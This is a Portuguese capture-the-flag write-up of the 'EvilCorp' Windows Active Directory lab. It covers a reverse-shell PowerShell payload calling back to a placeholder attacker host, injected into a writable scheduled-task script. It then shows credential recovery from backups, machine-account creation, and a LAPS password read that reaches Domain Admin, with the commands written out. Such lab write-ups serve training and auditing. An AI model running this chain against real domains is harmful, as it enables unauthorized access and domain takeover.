---
title: "EvilCorp"
description: "Máquina Windows/AD onde share SMB writable permite injectar reverse shell em scheduled task. Credenciais em backup revelam misconfiguration LAPS onde Domain Computers podem ler ms-MCS-AdmPwd — machine account + LAPS read leva a Domain Admin."
date: 2026-04-08
draft: false
locale: "pt"
platform: "HackingClub"
difficulty: "Easy"
os: "Windows"
tags: ["active-directory", "laps", "smb", "scheduled-tasks", "machine-account"]
categories: ["Active Directory", "Lateral Movement", "Privesc"]
---

> Máquina **Windows Server 2022** com Active Directory onde um share **SMB writable** permite injectar um reverse shell numa scheduled task. Credenciais encontradas num backup levam à enumeração **LAPS**, onde uma misconfiguration nas ACLs permite a qualquer `Domain Computer` ler a password do Administrator.

## Recon

### SMB

Enumeração anónima do SMB revelou um share `scripts` com permissões de leitura e escrita para `Guest`.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' --shares
```

```text
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
scripts         READ,WRITE
SYSVOL          READ            Logon server share
```

Dentro do share `scripts` existia um ficheiro `autobackup.ps1` — um script PowerShell executado por uma scheduled task a cada minuto.

```bash
smbclient //<TARGET_IP>/scripts -U 'Guest%' -c 'get autobackup.ps1'
```

O script usa `tar` para criar backups de `C:\files` em `C:\backups`, executado como o utilizador `phillip`.

## Foothold

Com escrita no share, foi possível injectar um **reverse shell PowerShell encoded** directamente no `autobackup.ps1`. O payload foi adicionado antes do código legítimo do script para executar na próxima iteração da scheduled task.

```powershell
# Gerar payload
$code = '$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",443); ...'
$bytes = [Text.Encoding]::Unicode.GetBytes($code)
$b64 = [Convert]::ToBase64String($bytes)
```

A linha `powershell -e <BASE64>` foi adicionada ao início do `autobackup.ps1` e *uploaded* via `smbclient`.

```bash
smbclient //<TARGET_IP>/scripts -U 'Guest%' -c 'put autobackup.ps1'
```

Com um listener na porta 443 (`nc -lvnp 443`), a shell como `evilcorp\phillip` chegou em menos de um minuto. A flag de *user* foi obtida em `C:\Users\phillip\Desktop\user.txt`.

## Privilege Escalation

### Credenciais no backup

Os backups em `C:\backups` continham ficheiros de `C:\files`, incluindo credenciais do `phillip`.

```bash
tar -tzf C:\backups\backup_20250108_224501.tar.gz
# ./phillip/logins.txt

tar -xzf C:\backups\backup_20250108_224501.tar.gz -C C:\Users\phillip
type C:\Users\phillip\phillip\logins.txt
# User: phillip
# Password: <PASSWORD>
```

### Enumeração LAPS

Com as credenciais do `phillip`, a enumeração do domínio revelou que o `DC-01` está na `OU=LAPS` com uma GPO configurada. A análise do `Registry.pol` da GPO revelou que o `AdministratorAccountName` aponta para `elliot` — um Domain Admin.

```text
# Registry.pol decoded
SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS
  AdministratorAccountName: elliot
  PasswordComplexity: 4
  PasswordLength: 14
  PasswordEncryptionEnabled: 1
  BackupDirectory: 2 (Active Directory)
```

O atributo `ms-MCS-AdmPwd` (LAPS legacy) não era legível pelo `phillip`. Contudo, a análise das ACLs com `dsacls` revelou a misconfiguration:

```text
Allow EVILCORP\Domain Computers  SPECIAL ACCESS for ms-Mcs-AdmPwd
```

O grupo **Domain Computers** tem permissão de leitura no atributo LAPS password. Como `phillip` possui `SeMachineAccountPrivilege`, foi possível criar uma machine account e usá-la para ler a password.

### Machine Account + LAPS Read

```bash
# Criar machine account
impacket-addcomputer evilcorp.hc/phillip:<PASSWORD> \
  -computer-name 'FAKE01$' \
  -computer-pass '<PASSWORD>' \
  -dc-ip <TARGET_IP>

# Ler LAPS password com a machine account
nxc ldap DC-01.evilcorp.hc -u 'FAKE01$' -p '<PASSWORD>' -M laps
```

```text
LAPS  Computer:DC-01$  User:  Password:<LAPS_PASSWORD>
```

A password retornada pertence ao `Administrator` (legacy LAPS). Com ela, o acesso como **Domain Admin** foi confirmado.

```bash
nxc smb DC-01.evilcorp.hc -u Administrator -p '<LAPS_PASSWORD>' \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
# [+] evilcorp.hc\Administrator:<LAPS_PASSWORD> (Pwn3d!)
```

A flag de *root* foi lida em `C:\Users\Administrator\Desktop\root.txt`.

## Attack Path

| Etapa     | Vetor                                                                                  |
|-----------|----------------------------------------------------------------------------------------|
| Recon     | Share SMB `scripts` writable com acesso Guest                                          |
| Foothold  | Reverse shell PowerShell encoded injectado no `autobackup.ps1` → shell como phillip    |
| Privesc   | Credenciais em backup → LAPS ACL abuse → machine account + LAPS read → Domain Admin    |

## References

- [LAPS — HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html)
- [Reading LAPS passwords — ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/reading-laps-passwords)
- [impacket-addcomputer — fonte do exemplo oficial](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
- [MachineAccountQuota — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota)

## Lessons Learned

- **SMB anônimo writable** é jogo acabado em Windows com scheduled tasks — sempre enumerar Guest access com `nxc --shares`.
- **Scheduled tasks em PS** são gold mines para persistência e escalada: injetar payload antes do código legítimo mantém a função original e não levanta suspeita.
- **LAPS legacy (`ms-MCS-AdmPwd`)** tem ACLs frágeis — o BloodHound `ReadLAPSPassword` edge revela isso rapidamente.
- **`SeMachineAccountPrivilege`** (MachineAccountQuota >= 1) + read ACL via `Domain Computers` = bypass. Sempre auditar `dsacls` no OU do DC.
- `impacket-addcomputer` + credencial de usuário padrão cria uma máquina que herda as permissões do grupo `Domain Computers` — lateralização subtil mas devastadora.
